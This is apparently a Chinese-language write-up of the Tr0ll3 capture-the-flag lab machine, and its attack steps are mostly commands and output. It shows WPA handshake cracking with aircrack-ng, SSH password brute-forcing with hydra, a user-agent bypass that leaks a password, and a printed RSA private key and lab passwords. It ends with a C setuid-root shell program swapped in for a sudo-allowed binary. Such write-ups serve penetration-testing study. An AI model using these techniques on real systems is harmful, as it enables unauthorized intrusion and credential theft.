
## 靶机介绍
 
Tr0ll 系列的最新版本。这个版本与之前的版本略有不同，我认为它仍处于初学者++级别。希望大家玩得开心，请务必标记@Maleus21 并附上旗帜的屏幕截图。

您需要使用以下方式登录start：here
## 端口扫描

就一个22端口

## ssh连接
根据描述ssh连接
start：here

```bash
start@Tr0ll3:~$ ls -la
total 40
drwx------  7 start start 4096 Aug  2  2019 .
drwxr-xr-x 10 root  root  4096 Jun 19  2015 ..
drwxrwxr-x  2 start start 4096 Jun 19  2015 ...
-rw-r--r--  1 start start  220 Jun 17  2015 .bash_logout
-rw-r--r--  1 start start 3637 Jun 17  2015 .bashrc
drwxrwxr-x  2 start start 4096 Jun 18  2015 bluepill
drwx------  2 start start 4096 Jun 17  2015 .cache
drwx------  3 start start 4096 Aug  1  2019 .gnupg
-rw-r--r--  1 start start  675 Jun 17  2015 .profile
drwxrwxr-x  2 start start 4096 Jun 17  2015 redpill
start@Tr0ll3:~$ cd redpill/
start@Tr0ll3:~/redpill$ ls -la
total 12
drwxrwxr-x 2 start start 4096 Jun 17  2015 .
drwx------ 7 start start 4096 Aug  2  2019 ..
-rw-rw-r-- 1 start start   17 Jun 17  2015 this_will_surely_work
start@Tr0ll3:~/redpill$ cat this_will_surely_work
step2:Password1!
```

step2:Password1!
但是这个密码不是step2用户的ssh密码

找文件
```bash
start@Tr0ll3:/tmp$ find / -perm 777 -type f 2>/dev/null
/var/log/.dist-manage/wytshadow.cap
/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt
```
![](images/2024-05-26-14-26-10.png)
由802.11判断
这是一个无线网络数据包
```bash
┌──(kali㉿kali)-[~/workspace]
└─$ aircrack-ng -w gold_star.txt wytshadow.cap
Reading packets, please wait...
Opening wytshadow.cap
Read 1183 packets.

   #  BSSID              ESSID                     Encryption

   1  18:D6:C7:3F:23:89  wytshadow                 WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening wytshadow.cap
Read 1183 packets.

1 potential targets

                               Aircrack-ng 1.7

      [00:09:43] 2392372/3248872 keys tested (4168.08 k/s)

      Time left: 3 minutes, 25 seconds                          73.64%

                          KEY FOUND! [ gaUoCe34t1 ]


      Master Key     : ED 12 0B 40 F5 AF 80 16 F5 F7 4F 9F 9E 39 BB AE
                       00 32 07 E9 26 81 31 DB 9C 54 64 84 5E 5D 19 C6

      Transient Key  : 7F 1C A9 01 4E B9 B3 6F B3 95 7D D2 6E C9 10 BE
                       50 D4 1A 6C 72 F8 AB 8B 97 A4 20 B1 2D 92 19 18
                       C7 86 C0 17 2D 05 28 C7 6F 95 06 12 4F C2 F5 2A
                       87 B7 F5 21 22 3D F7 CA BC 99 8B B5 CA 15 EA 43

      EAPOL HMAC     : 73 4D E4 22 8E B7 F2 91 4E 74 7D CF 59 73 80 F7
```
aircrack-ng爆破


```bash
┌──(kali㉿kali)-[~/workspace]
└─$ hydra -L users.list -p gaUoCe34t1 192.168.10.27 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-26 03:32:03
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:8/p:1), ~1 try per task
[DATA] attacking ssh://192.168.10.27:22/
[22][ssh] host: 192.168.10.27   login: wytshadow   password: gaUoCe34t1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-26 03:32:06
```

ssh连接查看sudo权限
```bash
wytshadow@Tr0ll3:/lol/bin$ sudo -l
Matching Defaults entries for wytshadow on Tr0ll3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wytshadow may run the following commands on Tr0ll3:
    (root) /usr/sbin/service nginx start
```
有个启洞nginx的sudo权限
```bash
wytshadow@Tr0ll3:/etc/nginx$ cd sites-available/
wytshadow@Tr0ll3:/etc/nginx/sites-available$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Aug  1  2019 .
drwxr-xr-x 8 root root 4096 Aug  1  2019 ..
-rw-r--r-- 1 root root 2474 Aug  1  2019 default
wytshadow@Tr0ll3:/etc/nginx/sites-available$ cat default
##
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# https://www.nginx.com/resources/wiki/start/
# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
# https://wiki.debian.org/Nginx/DirectoryStructure
#
# In most cases, administrators will remove this file from sites-enabled/ and
# leave it as reference inside of sites-available where it will continue to be
# updated by the nginx packaging team.
#
# This file will automatically load configuration files provided by other
# applications, such as Drupal or Wordpress. These applications will be made
# available underneath a path with that package name, such as /drupal8.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

# Default server configuration
#
server {
        listen 8080 default_server;
        listen [::]:8080 default_server;
                if ($http_user_agent !~ "Lynx*"){
    return 403;
}
        # SSL configuration
        #
        # listen 443 ssl default_server;
        # listen [::]:443 ssl default_server;
        #
        # Note: You should disable gzip for SSL traffic.
        # See: https://bugs.debian.org/773332
        #
        # Read up on ssl_ciphers to ensure a secure configuration.
        # See: https://bugs.debian.org/765782
        #
        # Self signed certs generated by the ssl-cert package
        # Don't use them in a production server!
        #
        # include snippets/snakeoil.conf;

        root /var/nginx/www;

        # Add index.php to the list if you are using PHP
        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
                try_files $uri $uri/ =404;
        }

        # pass PHP scripts to FastCGI server
        #
        #location ~ \.php$ {
        #       include snippets/fastcgi-php.conf;
        #
        #       # With php-fpm (or other unix sockets):
        #       fastcgi_pass unix:/var/run/php/php7.0-fpm.sock;
        #       # With php-cgi (or other tcp sockets):
        #       fastcgi_pass 127.0.0.1:9000;
        #}

        # deny access to .htaccess files, if Apache's document root
        # concurs with nginx's one
        #
        #location ~ /\.ht {
        #       deny all;
        #}
}


# Virtual Host configuration for example.com
#
# You can move that to a different file under sites-available/ and symlink that
# to sites-enabled/ to enable it.
#
#server {
#       listen 80;
#       listen [::]:80;
#
#       server_name example.com;
#
#       root /var/www/example.com;
#       index index.html;
#
#       location / {
#               try_files $uri $uri/ =404;
#       }
#}
wytshadow@Tr0ll3:/etc/nginx/sites-available$ netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.10.27:22        192.168.10.12:52840     ESTABLISHED -
tcp        0      0 192.168.10.27:22        192.168.10.12:53776     ESTABLISHED -
tcp6       0      0 :::8080                 :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```
![](images/2024-05-26-16-41-25.png)
配置文件中检查ua头是否是lynx浏览器
改个ua头访问得到用户密码
genphlux:HF9nd0cR!
```bash
genphlux@Tr0ll3:~$ ls -la
total 44
drwx------  4 genphlux genphlux 4096 Aug  2  2019 .
drwxr-xr-x 10 root     root     4096 Jun 19  2015 ..
-rw-r--r--  1 genphlux genphlux  220 Jun 17  2015 .bash_logout
-rw-r--r--  1 genphlux genphlux 3637 Jun 17  2015 .bashrc
drwx------  2 genphlux genphlux 4096 Jun 17  2015 .cache
drwx------  3 genphlux genphlux 4096 Aug  1  2019 .gnupg
-rw-rw-r--  1 genphlux genphlux 1675 Jun 18  2015 maleus
-rw-r--r--  1 genphlux genphlux  675 Jun 17  2015 .profile
-rw-------  1 genphlux genphlux 5649 Jun 17  2015 .viminfo
-rw-rw-r--  1 genphlux genphlux  931 Aug  2  2019 xlogin
genphlux@Tr0ll3:~$ cat maleus
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwz5Hwer48U1t/Qi9JveuO+Z7WQlnmhOOs/2pZ0he/OyVsEFv
DsGib1wu/N8t+7h9JZK9x2GL33TXQBVCy6TxES90F1An+2DSza6lJPCyhcgK/DEp
yxSVt32A+lFo+PQJV6QYZlpRkek0MjUw5y/E5qZwdBypC55C4QzgQBN3+Lnuhuk4
u52xcK9/6/2N7JZCNYA21Tp1Uy9mty/65IT7OwKJd2rXp3O6rZYTD/vPl+Rt/LtN
gA1DbDODq0NCmvcrZL+SafSj+MABA3LCERw01gA4RMdyxJU6hVfjeSKOdwDQOGWe
eAVCL2GR/frwyf+rfN1kbpdw/RGXWWwVANMcaQIDAQABAoIBAGNudFztrZo2NK2I
pcwSl0kqN+dAQuLU0vgXVw6ibL2iPxlkOYrqUi8kY0mk32YyrolUEhJYO0Ox3W1l
Zn8PoTV/VUAKMlJzHOhi6PfHHSPEnNOSthYWhajM4cKZczxWC+v2RfbaSHBms45e
SGl0inJskRiRAAZKswSp6gq334FrS6Dwy1tiKvzCfR3kLQghV5U/PhFZCsq3xvAw
eXPx2toNtU2gYSGrKWTep+nAKM1neBxeZAujYuN4xJ5/Th2y0pyTvX9WEgzKPJ/G
PlYZYCUAKPCbabYSuZckjeiN1aS52AIFedECBfAIezOr08Wx/bI/xCOgBxrQgPrK
kRvlOYECgYEA5eCIEfdLhWdg3ltadYE0O5VAoXKrbxYWqSyw1Eyeqj0N1qD9Rsvg
jIQJazV5JcVBIF54f/jlCJozR5s5AELrY0Z/krea1lF5ecOSUQE3tp94298xzO3g
7BBe3g6pD56Cya/Vo0+YVQmAnBHLh6QIYvUUXXN2IyceT8fhEx5JA+sCgYEA2W4z
KKMVAdPxKcjVks1zdGmVlj1RsUkakYuLWV3jQe2w1naJrc37Khy5eWZaRJhXqeBb
1cvTMa+r/BF7jvItxglWoBJqXDxKI0a6KqWtloZL2ynoaBkAhR2btob6nSN63Bpg
ZYJKY1B5yYbDHK4k6QT7atn2g6DAv/7sW6skj/sCgYA16WTAIek6TjZvr6kVacng
N27C7mu6T8ncvzhxcc68SjlWnscHtYTiL40t8YqKCyrs9nr4OF0umUtxfbvujcM6
syv0Ms9DeDQvFGjaSpjQYbIsjrnVP+zCMEyvc2y+1wQBXRWTiXVGbEYXVC0RkKzO
2H+AMzX/pIr9Vvk4TJ//JQKBgFNJcy9NyO46UVbAJ49kQ6WEDFjQhEp0xkiaO3aw
EC1g7yw3m+WH0X4AIsvt+QXtlSbtWkA7I1sU/7w+tiW7fu0tBpGqfDN4pK1+mjFb
5XKTXttE4lF9wkU7Yjo42ib3QEivkd1QW05PtVcM2BBUZK8dyXDUrSkemrbw33j9
xbOhAoGBAL8uHuAs68ki/BWcmWUUer7Y+77YI/FFm3EvP270K5yn0WUjDJXwHpuz
Fg3n294GdjBtQmvyf2Wxin4rxl+1aWuj7/kS1/Fa35n8qCN+lkBzfNVA7f626KRA
wS3CudSkma8StmvgGKIU5YcO8f13/3QB6PPBgNoKnF5BlFFQJqhK
-----END RSA PRIVATE KEY-----
```

在.viminfo中发现密码信息
```bash
maleus@Tr0ll3:~$ cat .viminfo
# This viminfo file was generated by Vim 7.4.
# You may edit it if you're careful!

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:wq
:q
:q!
:!shell

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:
""1     LINE    0
        passwd
"2      LINE    0
        B^slc8I$
"3      LINE    0
        passswd
```
maleus/B^slc8I$

## 程序劫持

maleus sudo 权限
```bash
maleus@Tr0ll3:/tmp$ sudo -l
[sudo] password for maleus:
Matching Defaults entries for maleus on Tr0ll3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User maleus may run the following commands on Tr0ll3:
    (root) /home/maleus/dont_even_bother
```
dont_even_bother是c语言编译的程序
直接替换成恶意提权程序

```c
int main (void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}
```
编译后执行提权
```bash
maleus@Tr0ll3:/tmp$ gcc dont_even_bother.c -o dont_even_bother
dont_even_bother.c: In function ‘main’:
dont_even_bother.c:2:8: warning: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration]
        setresuid(0, 0, 0);
        ^~~~~~~~~
dont_even_bother.c:3:8: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
        system("/bin/sh");
        ^~~~~~
maleus@Tr0ll3:/tmp$ ls
dont_even_bother    systemd-private-4d1ccd309edf4893b3103ba6e5625e9b-apache2.service-bvN8Ft            tmux-1001
dont_even_bother.c  systemd-private-4d1ccd309edf4893b3103ba6e5625e9b-systemd-resolved.service-lEtgqI
linpeas.sh          systemd-private-4d1ccd309edf4893b3103ba6e5625e9b-systemd-timesyncd.service-mclG8C
maleus@Tr0ll3:/tmp$ sudo /home/maleus/dont_even_bother

 Enter the password :


 Wrong Password
maleus@Tr0ll3:/tmp$ mv dont_even_bother /home/maleus/dont_even_bother
maleus@Tr0ll3:/tmp$ sudo /home/maleus/dont_even_bother
# whoami
root
#
```

